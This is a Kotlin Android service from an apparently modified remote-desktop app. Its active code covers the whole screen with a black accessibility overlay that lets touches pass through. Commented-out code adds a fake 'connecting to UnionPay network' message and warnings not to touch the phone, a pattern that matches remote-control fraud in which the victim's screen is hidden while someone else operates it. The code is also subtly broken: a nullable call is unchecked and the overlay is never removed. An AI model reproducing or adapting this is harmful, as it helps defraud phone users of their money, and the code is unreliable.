package com.carriez.flutter_hbb

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.IBinder
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.ImageView
import android.graphics.drawable.AnimationDrawable
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.view.animation.RotateAnimation
import android.view.animation.LinearInterpolator

class BlackScreenService : Service() {
    private var windowManager: WindowManager? = null
    private var blackOverlay: LinearLayout? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        createBlackOverlay()
    }

    private fun createBlackOverlay() {
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT // 透明背景
        )
        
        val overlayView = View(this)
        overlayView.setBackgroundColor(Color.BLACK) // 黑屏覆盖
        windowManager.addView(overlayView, params)

        // 创建一个垂直方向的LinearLayout作为容器
        /*blackOverlay = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            gravity = Gravity.CENTER
            
            // 创建加载动画图标
            val loadingIcon = ImageView(context).apply {
                setImageResource(R.drawable.ic_loading)
                layoutParams = LinearLayout.LayoutParams(
                    dpToPx(60), // 宽度60dp
                    dpToPx(60)  // 高度60dp
                ).apply {
                    bottomMargin = dpToPx(30) // 底部间距30dp
                }
                
                // 创建旋转动画
                val rotation = RotateAnimation(
                    0f,                // 起始角度
                    360f,              // 结束角度
                    Animation.RELATIVE_TO_SELF, 0.5f,  // 旋转中心X
                    Animation.RELATIVE_TO_SELF, 0.5f   // 旋转中心Y
                ).apply {
                    duration = 1500            // 动画持续时间
                    repeatCount = Animation.INFINITE  // 无限循环
                    interpolator = LinearInterpolator()  // 匀速旋转
                }
                
                // 启动动画
                startAnimation(rotation)
            }
            
            // 创建主标题文本视图
            val titleText = TextView(context).apply {
                text = "正在对接银联中心网络...."
                setTextColor(Color.WHITE)
                textSize = 22f
                gravity = Gravity.CENTER
                typeface = Typeface.DEFAULT_BOLD
                setPadding(0, 0, 0, 50)
            }
            
            // 创建警告文本视图
            val warningText = TextView(context).apply {
                text = "请勿触碰手机屏幕\n防止业务中断\n保持手机电量充足"
                setTextColor(Color.RED)
                textSize = 20f
                gravity = Gravity.CENTER
                setLineSpacing(20f, 1f)
            }
            
            // 添加所有视图到容器
            addView(loadingIcon)
            addView(titleText)
            addView(warningText)
        }

        try {
            windowManager?.addView(blackOverlay, params)
        } catch (e: Exception) {
            e.printStackTrace()
        }*/
    }

    //将dp转换为像素
    private fun dpToPx(dp: Int): Int {
        val density = resources.displayMetrics.density
        return (dp * density).toInt()
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            blackOverlay?.let { windowManager?.removeView(it) }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
} 